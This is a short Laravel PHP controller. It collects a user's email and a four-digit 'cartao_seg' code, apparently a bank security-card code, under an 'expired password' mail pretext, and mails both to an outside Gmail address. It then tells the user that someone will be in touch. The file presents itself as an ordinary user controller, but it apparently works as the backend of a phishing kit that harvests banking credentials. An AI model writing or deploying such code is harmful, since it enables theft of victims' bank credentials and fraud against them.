<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\SenhaVencidaMail;

class UserController extends Controller
{
   public function checkEmail(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'cartao_seg' => 'required|digits:4',
        ]);

        $dados = $request->only('email', 'cartao_seg');

        Mail::to('argontechsolut@gmail.com')->send(new SenhaVencidaMail($dados));

        return back()->with('status', 'Seu pedido foi enviado. Em breve entraremos em contato.');
    }
}

